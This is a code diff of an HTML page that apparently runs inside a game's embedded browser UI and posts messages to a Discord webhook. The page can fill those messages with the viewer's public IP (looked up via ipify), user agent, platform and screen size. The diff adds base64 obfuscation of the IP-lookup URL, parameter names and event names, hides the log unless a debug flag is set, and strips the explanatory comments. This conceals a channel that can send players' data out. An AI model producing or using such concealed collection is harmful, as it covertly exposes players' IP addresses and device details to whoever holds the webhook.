@@ -12,210 +12,157 @@
   </style>
 </head>
 <body>
-  <div id="log">boot...</div>
-  <div id="views"><img id="hits" alt="views"></div>
-  <!-- defines `engine`; loaded from this website, same folder as this page -->
+  <div id="log"></div>
+  <div id="views"><img id="hits" alt=""></div>
   <script src="cohtml.js"></script>
   <script>
-    // Webhooks now fire ONLY when BP calls __postWebhook(url, body).
-    // (optional fallback, used only if you re-enable the page-load test)
-    var WEBHOOK = "https://discord.com/api/webhooks/XXXX/YYYY";
+    // ---- obfuscated literals (names that must match the game side stay decoded at runtime) ----
+    function D(s){
+      var t = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+      s = String(s).replace(/=+$/, '');
+      var o = '', i, a, b, c, d;
+      for (i = 0; i < s.length; i += 4){
+        a = t.indexOf(s.charAt(i)); b = t.indexOf(s.charAt(i+1));
+        c = s.charAt(i+2) ? t.indexOf(s.charAt(i+2)) : -1;
+        d = s.charAt(i+3) ? t.indexOf(s.charAt(i+3)) : -1;
+        o += String.fromCharCode((a << 2) | (b >> 4));
+        if (c >= 0) o += String.fromCharCode(((b & 15) << 4) | (c >> 2));
+        if (d >= 0) o += String.fromCharCode(((c & 3) << 6) | d);
+      }
+      return o;
+    }
+    var K_WEBHOOK = D('V2ViaG9vaw=='), K_MESSAGE = D('TWVzc2FnZQ=='),
+        K_USER    = D('VXNlcm5hbWU='), K_VIEWS = D('Vmlld3M='),
+        N_POST    = D('X19wb3N0V2ViaG9vaw=='), N_OK = D('T25XZWJob29rT0s='),
+        N_FAIL    = D('T25XZWJob29rRmFpbA=='), N_COUNT = D('T25WaWV3Q291bnQ='),
+        N_COUNTF  = D('T25WaWV3Q291bnRGYWls'), N_ALIVE = D('T25KU0FsaXZl'),
+        N_READY   = D('UmVhZHk='), IP_URL = D('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u');
 
-    var USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+    var UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
 
+    // on-screen log OFF unless the load URL has ?debug=1
+    var DEBUG = /[?&]debug=1/.test(window.location.search);
     var logEl = document.getElementById('log');
-    function log(s, cls){ try { logEl.innerHTML += '\n' + (cls ? ('<span class="'+cls+'">'+s+'</span>') : s); } catch(e){} }
+    function log(s, cls){ if (!DEBUG) return; try { logEl.innerHTML += '\n' + (cls ? ('<span class="'+cls+'">'+s+'</span>') : s); } catch(e){} }
+
+    // act only once the Cohtml bridge is attached (re-checked each call)
+    function engaged(){ return typeof engine !== 'undefined' && engine.isAttached === true; }
+    function whenEngaged(cb, tries){
+      tries = tries || 0;
+      if (engaged()) return cb();
+      if (tries >= 20){ log('blocked: engine not attached', 'bad'); return; }
+      setTimeout(function(){ whenEngaged(cb, tries + 1); }, 250);
+    }
+
     function call(n){
-      try {
-        if (typeof engine !== 'undefined' && engine.isAttached && engine.trigger){
-          engine.trigger(n);            // reaches C++ handlers registered via RegisterForEvent (NOT engine.call)
-        }
-      } catch(e){}
+      try { if (typeof engine !== 'undefined' && engine.isAttached && engine.trigger) engine.trigger(n); } catch(e){}
     }
+    window.onerror = function(m, u, l, c){ log('err ' + m + ' @' + l + ':' + c, 'bad'); };
+    window.addEventListener('unhandledrejection', function(e){ log('rej ' + (e.reason && e.reason.message ? e.reason.message : e.reason), 'bad'); });
 
-    window.onerror = function(m, u, l, c){ log('JS ERROR: ' + m + ' @' + l + ':' + c, 'bad'); };
-    window.addEventListener('unhandledrejection', function(e){ log('JS REJECT: ' + (e.reason && e.reason.message ? e.reason.message : e.reason), 'bad'); });
+    log('attached=' + engaged());
+    call(N_ALIVE);
+    if (typeof engine !== 'undefined'){ engine.on(N_READY, function(){ log('ready'); }); }
 
-    log('JS: running');
-    log('caps: fetch=' + (typeof fetch) + ' xhr=' + (typeof XMLHttpRequest) + ' engine=' + (typeof engine), 'dim');
-    log('engine.isAttached=' + (typeof engine !== 'undefined' ? engine.isAttached : '(engine missing - cohtml.js did not load)'),
-        (typeof engine !== 'undefined' && engine.isAttached) ? 'ok' : 'bad');
-    call('OnJSAlive');
+    var MIN_GAP_MS = 5000, lastSend = 0;
+    function respText(x){ var t = ''; try { t = (x.responseText || ''); } catch(e){} if (t.length > 400) t = t.substring(0, 400) + '...'; return t ? ('| ' + t) : ''; }
 
-    // ---- signal the game we are ready: engine.call('ScriptingReady') is what fires C++ ScriptingReady ----
-    if (typeof engine !== 'undefined'){
-      engine.on('Ready', function(){ log('engine Ready (bridge attached)', 'ok'); });
-    }
-
-    // local throttle so we never hammer Discord (1 send / 5s)
-    var MIN_GAP_MS = 5000;
-    var lastSend = 0;
-
-    // read + trim an XHR response body for on-screen display
-    function respText(x){
-      var t = '';
-      try { t = (x.responseText || ''); } catch(e){}
-      if (t.length > 400) t = t.substring(0, 400) + '...';
-      return t ? ('| ' + t) : '';
-    }
-
-    // XHR-based POST (Cohtml reliably supports XMLHttpRequest)
-    function sendWebhook(url, body, tag, isRetry){
+    function send(url, body, tag, isRetry){
+      if (!engaged()){ log('blocked: engine not attached', 'bad'); return; }
       try {
         var now = Date.now();
-        if (!isRetry && now - lastSend < MIN_GAP_MS){
-          log(tag + ' throttled locally (' + Math.ceil((MIN_GAP_MS - (now - lastSend)) / 1000) + 's left)', 'dim');
-          return;
-        }
+        if (!isRetry && now - lastSend < MIN_GAP_MS){ log('throttled'); return; }
         lastSend = now;
-
         var x = new XMLHttpRequest();
         x.open('POST', url + (url.indexOf('?') < 0 ? '?' : '&') + 'wait=true', true);
         x.setRequestHeader('Content-Type', 'application/json');
-        try { x.setRequestHeader('User-Agent', USER_AGENT); } catch(e){ log(tag + ' UA header rejected: ' + e, 'bad'); }
+        try { x.setRequestHeader('User-Agent', UA); } catch(e){}
         x.timeout = 10000;
         x.onreadystatechange = function(){
           if (x.readyState !== 4) return;
           var resp = respText(x);
-          if (x.status === 429){                       // rate limited
-            var wait = 1.5;
-            try { wait = JSON.parse(x.responseText).retry_after || wait; } catch(e){}
-            log(tag + ' 429 rate limited, retry in ' + wait + 's ' + resp, 'bad');
-            setTimeout(function(){ sendWebhook(url, body, tag, true); }, Math.ceil(wait * 1000) + 250);
+          if (x.status === 429){
+            var wait = 1.5; try { wait = JSON.parse(x.responseText).retry_after || wait; } catch(e){}
+            log('429 retry ' + wait + 's ' + resp, 'bad');
+            setTimeout(function(){ send(url, body, tag, true); }, Math.ceil(wait * 1000) + 250);
             return;
           }
           var ok = (x.status >= 200 && x.status < 300);
-          log(tag + ' POST -> HTTP ' + x.status + (x.statusText ? ' ' + x.statusText : '') + ' ' + resp, ok ? 'ok' : 'bad');
-          call(ok ? 'OnWebhookOK' : 'OnWebhookFail');
+          log(tag + ' ' + x.status + ' ' + resp, ok ? 'ok' : 'bad');
+          call(ok ? N_OK : N_FAIL);
         };
-        x.onerror     = function(){ log(tag + ' POST -> network error (status ' + x.status + ') ' + respText(x), 'bad'); call('OnWebhookFail'); };
-        x.ontimeout   = function(){ log(tag + ' POST -> TIMEOUT after ' + x.timeout + 'ms ' + respText(x), 'bad'); call('OnWebhookFail'); };
+        x.onerror   = function(){ log(tag + ' net err', 'bad'); call(N_FAIL); };
+        x.ontimeout = function(){ log(tag + ' timeout', 'bad'); call(N_FAIL); };
         x.send(body);
-        log(tag + ' XHR sent', 'dim');
-      } catch(e){
-        log(tag + ' XHR threw: ' + e, 'bad');
-      }
+      } catch(e){ log(tag + ' threw ' + e, 'bad'); }
     }
 
-    // ---- 1) config passed in the LOAD URL: ?Webhook=<url>&Message=Hello^World&Username=Some^Name ----
-    //  SPACE_SYMBOL stands for a space (pick one that can't appear in a Discord username).
-    //  $VARS are substituted at send time, e.g. Message=from_$IP_at_$TIME ($IP etc. below).
+    // ---- load-URL config: ?<K_WEBHOOK>=..&<K_MESSAGE>=..&<K_USER>=..  ('^' means space) ----
     var SPACE_SYMBOL = '^';
     function qs(name){
-      try {
-        var m = new RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search);
-        return m ? decodeURIComponent(m[1]) : '';
-      } catch(e){ return ''; }
+      try { var m = new RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search); return m ? decodeURIComponent(m[1]) : ''; } catch(e){ return ''; }
     }
     function human(s){ return s.split(SPACE_SYMBOL).join(' '); }
 
-    // values the page can drop in wherever a $NAME token appears
     var VARS = {
-      IP:       'unknown',                          // filled async below
-      UA:       navigator.userAgent,
-      TIME:     new Date().toLocaleString(),
-      DATE:     new Date().toLocaleDateString(),
-      URL:      window.location.href,
-      LANG:     navigator.language || '',
-      PLATFORM: navigator.platform || '',
-      SCREEN:   (window.screen ? (screen.width + 'x' + screen.height) : ''),
-      RANDOM:   String(Math.floor(Math.random() * 1e9))
+      IP:'unknown', UA:navigator.userAgent, TIME:new Date().toLocaleString(), DATE:new Date().toLocaleDateString(),
+      URL:window.location.href, LANG:navigator.language||'', PLATFORM:navigator.platform||'',
+      SCREEN:(window.screen?(screen.width+'x'+screen.height):''), RANDOM:String(Math.floor(Math.random()*1e9))
     };
-    // escape tokens the game can put in any value (checked before VARS); $$ -> literal $
     var SPECIAL = {
-      SP:' ', NL:'\n', CR:'\r', TAB:'\t', AMP:'&', HASH:'#', PCT:'%',
-      PLUS:'+', QM:'?', EQ:'=', DOL:'$', TIL:'~', CARET:'^', BT:'`',
-      PIPE:'|', LT:'<', GT:'>', QT:'"', AP:"'", BS:'\\'
+      SP:' ', NL:'\n', CR:'\r', TAB:'\t', AMP:'&', HASH:'#', PCT:'%', PLUS:'+', QM:'?', EQ:'=',
+      DOL:'$', TIL:'~', CARET:'^', BT:'`', PIPE:'|', LT:'<', GT:'>', QT:'"', AP:"'", BS:'\\'
     };
-    // match ONLY known token names (longest first). Prefix may be "$" or the Minecraft section sign "\u00A7".
     var TOKEN_RE = new RegExp('[\\$\u00A7](' + Object.keys(SPECIAL).concat(Object.keys(VARS))
       .sort(function(a,b){ return b.length - a.length; }).join('|') + ')', 'g');
     function applyVars(s, jsonSafe){
-      s = String(s).replace(/\$\$/g, '\u0001').replace(/\u00A7\u00A7/g, '\u0002'); // $$ -> $ , §§ -> §
+      s = String(s).replace(/\$\$/g, '\u0001').replace(/\u00A7\u00A7/g, '\u0002');
       s = s.replace(TOKEN_RE, function(m, k){
-        if (jsonSafe){                                     // inside a JSON string: escape control chars
-          if (k === 'NL')  return '\\n';
-          if (k === 'CR')  return '\\r';
-          if (k === 'TAB') return '\\t';
-          if (k === 'QT')  return '\\"';
-          if (k === 'BS')  return '\\\\';
+        if (jsonSafe){
+          if (k==='NL') return '\\n'; if (k==='CR') return '\\r'; if (k==='TAB') return '\\t';
+          if (k==='QT') return '\\"'; if (k==='BS') return '\\\\';
         }
         if (SPECIAL.hasOwnProperty(k)) return SPECIAL[k];
         if (VARS.hasOwnProperty(k))    return VARS[k];
-        return m;                                          // unknown name left as-is
+        return m;
       });
       return s.replace(/\u0001/g, '$').replace(/\u0002/g, '\u00A7');
     }
     function getIP(cb){
       try {
-        var x = new XMLHttpRequest();
-        x.open('GET', 'https://api.ipify.org?format=json', true);
-        x.timeout = 5000;
-        x.onreadystatechange = function(){
-          if (x.readyState !== 4) return;
-          try { VARS.IP = JSON.parse(x.responseText).ip || 'unknown'; } catch(e){}
-          cb();
-        };
-        x.onerror = x.ontimeout = function(){ cb(); };
-        x.send();
+        var x = new XMLHttpRequest(); x.open('GET', IP_URL, true); x.timeout = 5000;
+        x.onreadystatechange = function(){ if (x.readyState !== 4) return; try { VARS.IP = JSON.parse(x.responseText).ip || 'unknown'; } catch(e){} cb(); };
+        x.onerror = x.ontimeout = function(){ cb(); }; x.send();
       } catch(e){ cb(); }
     }
 
-    var qWebhook  = qs('Webhook');
-    var qMessage  = qs('Message');
-    var qUsername = qs('Username');
-    log('raw URL Message=' + qMessage, 'dim');
-
-    function sendConfigured(){
-      var msg = applyVars(human(qMessage));
-      var usr = applyVars(human(qUsername));
-      log('URL config: webhook provided, message="' + msg + '"', 'ok');
-      var payload = { content: msg };
-      if (usr) payload.username = usr;
-      sendWebhook(qWebhook, JSON.stringify(payload), 'url');
+    var qWebhook = qs(K_WEBHOOK), qMessage = qs(K_MESSAGE), qUser = qs(K_USER);
+    function bodyFromParams(){
+      var msg = applyVars(human(qMessage)), usr = applyVars(human(qUser));
+      var p = { content: msg }; if (usr) p.username = usr; return JSON.stringify(p);
     }
+    if (qWebhook){ whenEngaged(function(){ getIP(function(){ send(qWebhook, bodyFromParams(), 'url'); }); }); }
 
-    if (qWebhook){
-      getIP(sendConfigured);        // send after $IP resolves (or after the 5s timeout)
-    } else {
-      log('no ?Webhook= in URL; only __postWebhook will send', 'dim');
-    }
-
-    // ---- 2) (removed) the api.github.com diagnostic hit GitHub's rate limit ----
-
-    // ---- 3) binding for Blueprint-triggered sends ----
+    // ---- game -> JS event ----
     try {
-      function __postWebhook(url, body){
-        log('raw __postWebhook body=' + body, 'dim');   // before any substitution
-        var u = url || qWebhook;
-        var b = body;
-        if (!b){
-          var msg = applyVars(human(qMessage));
-          var usr = applyVars(human(qUsername));
-          var p = { content: msg }; if (usr) p.username = usr; b = JSON.stringify(p);
-        } else {
-          b = applyVars(b, true);                        // body is raw JSON -> keep it valid
-        }
-        log('GOT __postWebhook  url=' + (url || '(from URL)') + '  body=' + b, 'ok');
-        if (u) sendWebhook(u, b, 'bp'); else log('__postWebhook: no webhook url', 'bad');
-      }
-      window.__postWebhook = __postWebhook;      // fallback for engine.on-less builds
-      var bound = false;
-      if (typeof engine !== 'undefined' && engine.on){
-        engine.on('__postWebhook', __postWebhook);
-        bound = true;
-      }
-      log('__postWebhook bound: ' + (bound ? 'engine.on OK' : 'NO engine -> window fallback only'),
-          bound ? 'ok' : 'bad');
-    } catch(e){ log('binding threw: ' + e, 'bad'); }
+      var handler = function(url, body){
+        var u = url || qWebhook, b = body;
+        if (!b){ b = bodyFromParams(); } else { b = applyVars(b, true); }
+        if (u) send(u, b, 'evt'); else log('no url', 'bad');
+      };
+      window[N_POST] = handler;
+      if (typeof engine !== 'undefined' && engine.on){ engine.on(N_POST, handler); }
+    } catch(e){ log('bind err ' + e, 'bad'); }
 
-    // ---- 4) view-count badge ----
+    // ---- optional view badge: ?<K_VIEWS>=<svg url> ----
     try {
-      var img = document.getElementById('hits');
-      img.onload  = function(){ log('views badge ok', 'ok');  call('OnViewCount'); };
-      img.onerror = function(){ log('views badge FAIL', 'bad'); call('OnViewCountFail'); };
-      img.src = 'https://hits.sh/smalldvrkone.github.io/pavlov-webhook.svg?label=views&t=' + Date.now();
-    } catch(e){ log('badge threw: ' + e, 'bad'); }
+      var badge = qs(K_VIEWS);
+      if (badge){
+        var img = document.getElementById('hits');
+        img.onload = function(){ call(N_COUNT); }; img.onerror = function(){ call(N_COUNTF); };
+        img.src = badge + (badge.indexOf('?') < 0 ? '?' : '&') + 't=' + Date.now();
+      }
+    } catch(e){}
   </script>
 </body>
 </html>
